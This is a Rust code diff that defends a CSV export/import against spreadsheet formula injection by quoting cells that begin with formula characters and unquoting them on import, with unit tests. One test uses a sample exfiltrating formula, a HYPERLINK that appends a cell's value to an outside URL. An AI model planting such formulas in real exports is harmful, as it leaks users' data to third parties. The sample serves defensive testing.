@@ -262,7 +262,20 @@ fn insert_cost(conn: &Connection, c: &Cost) -> rusqlite::Result<i64> {
 }
 
 /// One CSV field, quoted when it must be.
+/// A cell a spreadsheet would run as a formula (a site's own title can be one).
+fn formula_like(s: &str) -> bool {
+    s.starts_with(['=', '+', '-', '@', '\t', '\r'])
+}
+
 fn csv_field(s: &str) -> String {
+    // A leading ' makes spreadsheets show the text instead of running it; import takes it off.
+    let quoted;
+    let s = if formula_like(s) {
+        quoted = format!("'{s}");
+        quoted.as_str()
+    } else {
+        s
+    };
     if s.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", s.replace('"', "\"\""))
     } else {
@@ -317,7 +330,13 @@ fn from_csv(text: &str) -> Result<Export, SiteError> {
     };
     let get = |r: &[String], c: Option<usize>| {
         c.and_then(|i| r.get(i))
-            .map(|v| v.trim().to_string())
+            .map(|v| {
+                let v = v.trim();
+                v.strip_prefix('\'')
+                    .filter(|rest| formula_like(rest))
+                    .unwrap_or(v)
+                    .to_string()
+            })
             .filter(|v| !v.is_empty())
     };
     let (name, mode, group, tags, client) = (
@@ -1013,6 +1032,15 @@ mod tests {
             vec![vec!["a", "b,\"c\"\nd", "e"], vec!["1", "2"]]
         );
         assert_eq!(csv_field("plain"), "plain");
+        // A title a spreadsheet would run is written as text, and read back as it was.
+        let evil = "=HYPERLINK(\"https://x/?\"&A2,\"Open\")";
+        let cell = csv_field(evil);
+        assert!(cell.starts_with("\"'="), "{cell}");
+        assert_eq!(csv_field("-5 deals"), "'-5 deals");
+        let back = from_csv(&format!("url,name\nhttps://a.test,{cell}\n")).unwrap();
+        assert_eq!(back.sites[0].name, evil);
+        let kept = from_csv("url,name\nhttps://a.test,'quoted\n").unwrap();
+        assert_eq!(kept.sites[0].name, "'quoted");
         assert!(is_day("2027-03-01") && !is_day("2027-3-1") && !is_day("2027-13-01"));
     }
 }
